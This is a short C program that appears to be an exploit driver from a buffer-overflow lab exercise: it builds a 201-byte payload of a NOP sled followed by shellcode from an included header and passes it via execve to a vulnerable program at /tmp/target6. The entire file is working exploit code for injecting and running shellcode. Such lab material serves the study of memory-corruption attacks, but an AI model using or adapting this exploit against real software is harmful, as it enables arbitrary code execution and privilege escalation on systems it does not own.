#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

static char payload[201];

int main(void)
{
  char *args[3];
  char *env[1];

  memset(payload, 0x90, sizeof(payload));
  memcpy(payload + sizeof(payload) - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
